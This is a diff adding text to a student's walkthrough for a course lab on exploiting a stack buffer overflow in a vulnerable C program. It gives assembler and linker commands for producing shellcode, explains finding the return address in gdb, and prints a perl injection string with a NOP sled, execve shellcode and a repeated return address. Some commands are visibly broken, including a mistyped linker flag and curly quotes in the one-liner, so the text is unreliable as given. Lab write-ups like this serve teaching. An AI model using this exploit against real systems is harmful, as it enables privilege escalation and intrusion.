@@ -4,6 +4,8 @@ title: CS363 Lab 2 Walkthrough
 
 # CS363 Lab2 Walkthough (Fall 2016)
 
+**By Devon Smith and Aaron Earl**
+
 ## Compiling and testing the vulnerable application
 
 
@@ -119,13 +121,37 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 id is the application we want to run with our shell code. To start this process we're
-going to write some x86 assembly that we can turn into shell code.
+going to take our x86 assembly and turn it into code. To do this we take the asm above
+and save it into a .asm file. Then we use nasm to compile and dump out the assembly into its
+byte code.
 
-```asm
-
+```sh
+nasm -f elf shellcode.asm
+ld -0 shellcode shellcode.asm
+objdump -d shellcode
 ```
+
+The above shell commands will compile, load, and dump out the bytecode of the assembly. We can use the bytecode to turn into an injectable attack and run our program inside the vulnerable
+c program.
+
+## Identify the Return Address
+
+To actually inject the shell code we need to identify the return address of the vulnerable program. You can place break points and try to identify it by overflowing, or you can use the gdb command print &ebp to get the base pointer address. You must add 4 to this to get the actual return address. In this case mine ended up being \x50\xf7\xff\xbf. This is reversed from what is printed out because Intel systems are little endian.
   
 
 ## Creating Shell Code from x86 Assembly Code
 
-## 
+The shell code should print out as pairs of numbers. To inject it into the vulnerable program we can do this:
+
+```sh
+$(perl –e ‘ print \”x90”x25; print “\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x89\xe1\x31\xd2\xb0\x0b\xcd\x80”; print “\x50\xf7\xff\xbf”x5’)
+```
+
+The first part of this is called the NOP Sled. This pads the injection with No Ops to ensure that the buffer is overflowed and our code will be inserted. The second print will insert our program into the vulnerable program. The third print takes the return address and runs the program from there. The x5 prints the address 5 times to ensure that the system doesn't shift the addresses to compensate for oveflow. If you find your return addresses keep shifting this could be the most likely cause.
+
+** Hope this helps **
+
+## Resources and Notes:
+
+Further class readings and source code can be found in my CS363 Repository.
+[CS363 Repository]("https://github.com/aearl16/CS363")
